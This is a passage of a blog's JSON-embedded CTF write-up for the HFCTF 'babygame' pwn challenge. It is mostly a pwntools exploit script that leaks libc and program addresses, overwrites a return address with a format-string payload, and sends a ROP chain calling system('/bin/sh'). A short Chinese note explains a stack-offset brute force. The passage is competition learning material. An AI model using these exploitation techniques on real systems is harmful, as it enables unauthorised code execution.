p64(inp-tmppp)</span><br><span class=\"line\"></span><br><span class=\"line\">        io.sendlineafter(<span class=\"string\">&#x27;Good luck to you.&#x27;</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\"># s = io.recvuntil(&#x27;[&#x27; * (0x10 - len(p1)))</span></span><br><span class=\"line\">        <span class=\"comment\"># print s</span></span><br><span class=\"line\">        <span class=\"comment\"># print hex(len(s))</span></span><br><span class=\"line\"></span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>)</span><br><span class=\"line\">        func_addr = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>,drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>) - <span class=\"number\">0x000001543</span></span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;func_addr:&#x27;</span> + <span class=\"built_in\">hex</span>(func_addr))</span><br><span class=\"line\"></span><br><span class=\"line\">        io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>)</span><br><span class=\"line\">        atoi_addr = <span class=\"built_in\">int</span>(io.recvuntil(<span class=\"string\">&#x27;-&#x27;</span>, drop=<span class=\"literal\">True</span>), <span class=\"number\">16</span>) - <span class=\"number\">20</span></span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;atoi_addr:&#x27;</span> + <span class=\"built_in\">hex</span>(atoi_addr))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        libc = ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">        libc_base = atoi_addr - libc.sym[<span class=\"string\">&#x27;atoi&#x27;</span>]</span><br><span class=\"line\">        log.success(<span class=\"string\">&#x27;libc_base:&#x27;</span> + <span class=\"built_in\">hex</span>(libc_base))</span><br><span class=\"line\">        context.clear(arch = <span class=\"string\">&#x27;amd64&#x27;</span>, log_level=<span class=\"string\">&#x27;info&#x27;</span>)</span><br><span class=\"line\">        p = fmtstr_payload(<span class=\"number\">6</span>, &#123;inp-tmppp: func_addr+<span class=\"number\">0x000000014B6</span>&#125;, write_size=<span class=\"string\">&#x27;byte&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">try</span>:</span><br><span class=\"line\">            io.sendlineafter(<span class=\"string\">&#x27;Good luck to you.&#x27;</span>, p)</span><br><span class=\"line\"></span><br><span class=\"line\">            pop_rdi = <span class=\"number\">0x0015D2</span> + <span class=\"number\">1</span></span><br><span class=\"line\">            sys_addr = libc.sym[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">            binsh = libc.search(<span class=\"string\">&#x27;/bin/sh&#x27;</span>).<span class=\"built_in\">next</span>()</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># gdb.attach(io)</span></span><br><span class=\"line\"></span><br><span class=\"line\">            p = <span class=\"string\">&#x27;a&#x27;</span> * <span class=\"number\">0x108</span> + p64(canary) + p64(<span class=\"number\">0</span>) * <span class=\"number\">3</span> + p64(pop_rdi+func_addr+<span class=\"number\">1</span>) + p64(pop_rdi+func_addr) + p64(binsh + libc_base) + p64(sys_addr+libc_base)</span><br><span class=\"line\">            io.sendlineafter(<span class=\"string\">&#x27;Please input your name:&#x27;</span>, p)</span><br><span class=\"line\">            io.sendlineafter(<span class=\"string\">&#x27;: \\n&#x27;</span>, <span class=\"built_in\">str</span>(attack_rand()+<span class=\"number\">1</span>))</span><br><span class=\"line\">            <span class=\"built_in\">print</span> <span class=\"built_in\">hex</span>(tmppp)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">        <span class=\"keyword\">except</span>:</span><br><span class=\"line\">            tmppp += <span class=\"number\">8</span></span><br><span class=\"line\">            log.info(<span class=\"string\">&quot;tmp:  &quot;</span>, <span class=\"built_in\">hex</span>(tmppp))</span><br><span class=\"line\">            <span class=\"comment\"># io.close()</span></span><br><span class=\"line\">            rd.close()</span><br><span class=\"line\">            io = process([<span class=\"string\">&#x27;./ld-2.31.so&#x27;</span>, <span class=\"string\">&#x27;./babygame&#x27;</span>], env=&#123;<span class=\"string\">&#x27;LD_PRELOAD&#x27;</span>: <span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>&#125;)</span><br><span class=\"line\">            <span class=\"comment\"># io = remote(&#x27;120.25.205.249&#x27;, 38573)</span></span><br><span class=\"line\">            rd = process(<span class=\"string\">&#x27;./rd&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">pwn()</span><br><span class=\"line\">io.interactive()</span><br></pre></td></tr></table></figure>\n\n<p>小插曲：原来脚本地能跑通，远程打不通，然后我也没注意到q群有说明是更新了附件，自我分析了一点，怀疑是canary底下的栈地址本地和远程的偏移量不同，所以写了一个偏移量的爆破。</p>\n","path":"/p/HFCTF-Pwn-babygame/","permalink":"https://blog.csome.cc/p/HFCTF-Pwn-babygame/","tags":[{"name":"CTF","_id":"cuidhe2mLrs_RBYmTzHeWmv47","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuidE5EaGl_nziC_ifU_P2m7I","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"HFCTF","_id":"cuidd1iT0vIGJrtt7Q25NcRal","slug":"HFCTF","path":"tags/HFCTF/","permalink":"https://blog.csome.cc/tags/HFCTF/","length":1}],"categories":[],"prev":{"title":"[2022*CTF] Pwn examination wp","date":"2022-04-19T03:19:30.000Z","slug":"xinCTF-pwn-wp","published":true,"updated":"2025-10-28T08:00:40.778Z","_id":"cuidIdVhE3V1MnU5qOVptxdmn","layout":"post","photos":[],"excerpt":"","path":"/p/xinCTF-pwn-wp/","permalink":"https://blog.csome.cc/p/xinCTF-pwn-wp/","__post":true},"next":{"title":"SUSCTF pwn wp","date":"2022-03-01T07:46:32.000Z","slug":"SUSCTF-wp","published":true,"updated":"2025-10-28T08:00:40.756Z","_id":"cuid1GwmNagFSkc8cGstCUYeX","layout":"post","photos":[],"excerpt":"","path":"/p/SUSCTF-wp/","permalink":"https://blog.csome.cc/p/SUSCTF-wp/","__post":true},"__post":true}